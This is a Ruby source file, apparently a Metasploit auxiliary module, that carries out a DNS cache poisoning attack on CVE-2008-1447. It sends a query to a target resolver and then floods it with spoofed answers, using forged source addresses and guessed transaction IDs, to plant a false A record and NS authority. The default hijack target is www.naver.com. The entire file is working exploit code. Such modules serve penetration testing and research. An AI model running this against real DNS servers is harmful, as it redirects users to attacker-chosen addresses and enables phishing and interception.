##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/dns'
require 'resolv'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Capture

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DNS Cache Poisoning Attack',
      'Author'         => [ 'whichmeans' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-1447' ],
          [ 'OSVDB', '46776'],
          [ 'US-CERT-VU', '800113' ],
          [ 'URL', 'http://www.caughq.org/exploits/CAU-EX-2008-0002.txt' ],
        ],
      'DisclosureDate' => 'Jul 21 2008'
      ))

      register_options(
        [
          OptInt.new('BASEID', [true, 'Base ID of DNS responses', 1000]),
          OptString.new('HOSTNAME', [true, 'Hostname to hijack', 'www.naver.com']),
          OptAddress.new('NEWADDR', [true, 'New address for the hostname', '10.0.2.15']),
          OptPort.new('SRCPORT', [true, "Query source port of the target DNS server", 33333]),
          OptAddress.new('UPDNS', [true, 'Address of an upstream server', '10.0.2.15']),
          OptInt.new('XIDS', [true, 'Number of DNS responses to inject', 50])
        ])

      deregister_options('FILTER','INTERFACE','PCAPFILE','SNAPLEN','TIMEOUT')

  end

  def run
    check_pcaprub_loaded # Check first.

    target   = rhost()
    source   = Rex::Socket.source_address(target)
    sport    = datastore['SRCPORT']
    updns    = datastore['UPDNS']
    hostname = datastore['HOSTNAME'] + '.'
    address  = datastore['NEWADDR']
    xidbase  = datastore['BASEID']
    numxids  = datastore['XIDS'].to_i

    domain = hostname.sub(/\w+\x2e/,"")

    srv_sock = Rex::Socket.create_udp(
      'PeerHost' => target,
      'PeerPort' => 53
    )

    open_pcap unless self.capture

    print_status("Sending a DNS query for #{hostname}...")

    # Send spoofed query
    req = Resolv::DNS::Message.new
    req.id = rand(2**16)
    req.add_question(hostname, Resolv::DNS::Resource::IN::A)

    req.rd = 1

    p = PacketFu::UDPPacket.new
    p.ip_saddr = source
    p.ip_daddr = target
    p.ip_ttl = 255
    p.udp_sport = (rand((2**16)-1024)+1024).to_i
    p.udp_dport = 53
    p.payload = req.encode
    p.recalc

    capture_sendto(p, target)
    print_status("Sent a DNS query!")

    print_status("Injecting fake DNS answers for #{hostname}...")

    # Send evil spoofed answer from ALL nameservers (barbs[*][:addr])
    req.add_answer(hostname, 3600, Resolv::DNS::Resource::IN::A.new(address))
    req.add_authority(domain, 3600, Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(hostname)))
    req.qr = 1
    req.ra = 1

    # Reuse our PacketFu object
    p.udp_sport = 53
    p.udp_dport = sport.to_i
     xidbase.upto(xidbase+numxids-1) do |id|
      req.id = id
      p.payload = req.encode
      p.ip_saddr = updns
      p.recalc
      capture_sendto(p, target)
    end

    print_status("Injected #{numxids} fake DNS answers!")
  end

end
